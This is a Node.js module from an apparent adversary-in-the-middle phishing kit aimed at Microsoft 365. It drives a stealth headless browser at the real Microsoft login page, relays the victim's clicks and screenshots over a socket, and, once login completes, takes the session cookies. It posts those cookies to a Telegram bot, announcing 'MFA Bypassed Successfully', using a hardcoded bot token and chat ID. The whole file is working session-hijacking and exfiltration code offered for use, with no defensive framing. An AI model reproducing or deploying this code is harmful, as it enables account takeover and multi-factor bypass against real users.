const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { launch } = require('puppeteer-real-browser');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const message = `🚀 *NEW SESSION CAPTURED*\n\n*Target:* Microsoft 365\n*Status:* MFA Bypassed Successfully`;
    try {
        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { 
            chat_id: CHAT_ID, 
            text: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 4000)}\n\`\`\``,
            parse_mode: 'Markdown'
        });
    } catch (error) { console.error('Telegram error:', error.message); }
}

async function startSession(io, socket) {
    const { browser, page } = await launch({
        headless: 'new',
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
        fingerprint: true
    });

    await page.goto('https://login.microsoftonline.com/');

    socket.on('victim-action', async (data) => {
        try {
            if (data.type === 'click') await page.mouse.click(data.x, data.y);
            const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
            socket.emit('browser-render', { screenshot });
        } catch (e) {}
    });

    page.on('framenavigated', async (frame) => {
        if (frame.url().includes('shell/homepage')) {
            const cookies = await page.cookies();
            await sendExfiltrationAlert(cookies);
            socket.emit('success');
        }
    });
}
module.exports = { startSession };
